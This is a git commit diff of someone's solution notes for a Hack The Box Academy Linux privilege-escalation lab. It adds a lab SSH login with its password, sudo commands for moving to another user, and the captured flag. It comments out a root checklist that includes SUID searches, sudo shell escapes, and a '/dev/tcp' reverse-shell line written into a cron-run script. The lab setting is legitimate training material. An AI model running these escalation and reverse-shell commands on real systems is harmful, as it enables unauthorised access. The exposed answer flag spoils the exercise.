c171758b2579aadd6013746fcc294822b2c31128
Logan Bek <loganbek@gmail.com>
2024-06-21 03:45:55 +0000

    Update module-77-section-844.sh

--- module-77-section-844.sh
+++ module-77-section-844.sh
@@ -1,24 +1,32 @@
 # https://academy.hackthebox.com/module/77/section/844
 
 # SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
+ssh user1@94.237.63.3 -p 41964
+# password1
 ssh <USERNAME>@<TARGET_IP>-p port
 sudo -l
+sudo -u user2 /bin/bash
 sudo -u user2 -i
-cd /home/user2
+cd ../home/user2
 cat flag.txt
+# HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
 
 # Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
-ssh user1@target_ip -p port
-sudo -u user2 -i
-sudo -l
-find / -perm -4000 2>/dev/null
-find / -writable -type d 2>/dev/null
-cat /etc/crontab
-ls -la /etc/cron.d/
-sudo vim
-find . -exec /bin/sh \; -quit
-echo "bash -i >& /dev/tcp/your_ip/your_port 0>&1" > /path/to/writable/script
-nc -lvnp <YOUR_PORT>
-cd /root
-cat flag.txt
+
+
+
+
+# ssh user1@target_ip -p port
+# sudo -u user2 -i
+# sudo -l
+# find / -perm -4000 2>/dev/null
+# find / -writable -type d 2>/dev/null
+# cat /etc/crontab
+# ls -la /etc/cron.d/
+# sudo vim
+# find . -exec /bin/sh \; -quit
+# echo "bash -i >& /dev/tcp/your_ip/your_port 0>&1" > /path/to/writable/script
+# nc -lvnp <YOUR_PORT>
+# cd /root
+# cat flag.txt
 
